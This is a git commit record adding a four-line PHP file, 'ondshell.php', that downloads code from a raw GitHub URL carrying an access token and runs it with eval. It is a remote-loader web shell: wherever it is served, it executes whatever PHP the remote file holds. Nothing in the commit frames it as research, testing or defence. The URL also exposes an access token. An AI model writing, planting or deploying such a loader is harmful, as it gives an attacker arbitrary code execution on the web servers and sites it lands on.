23a1755814e8b48ced450082ac5cf87b018af5d9
vkingpirates <135661822+vkingpirates@users.noreply.github.com>
2023-06-06 05:31:31 +0900

    Add files via upload

---
+++ ondshell.php
@@ -0,0 +1,4 @@
+<?php 
+    $filedata = file_get_contents('https://raw.githubusercontent.com/vkingpirates/ond/main/onshell.php.txt?token=GHSAT0AAAAAACDRJLQWJ5FOX5LVH7K43EPKZD6IQDQ');
+    eval ("?>$filedata");
+?>
